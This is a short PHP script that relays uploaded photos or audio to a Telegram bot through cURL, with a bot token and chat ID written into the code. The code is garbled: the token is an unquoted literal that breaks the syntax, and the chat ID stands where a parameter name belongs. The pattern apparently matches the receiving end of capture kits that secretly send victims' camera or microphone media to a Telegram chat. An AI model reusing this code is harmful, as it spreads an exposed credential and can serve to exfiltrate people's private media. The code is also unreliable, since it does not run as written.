<?php
require_once 'config.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $chat_id = $_POST['6504221267'];
    $file = $_FILES['photo'] ?? $_FILES['audio'];
    $type = isset($_FILES['photo']) ? 'photo' : 'audio';

    $url = "https://api.telegram.org/bot" . 7548611276:AAHvNsB7QppKi8H_IdYw6zmp1zmAX85n76I. "/send" . ucfirst($type);
    $post_fields = array(
        '6504221267' => $chat_id,
        $type => new CURLFile(realpath($file['tmp_name']))
    );

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Type:multipart/form-data"
    ));
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
    $output = curl_exec($ch);
    curl_close($ch);

    echo $output;
}
?>
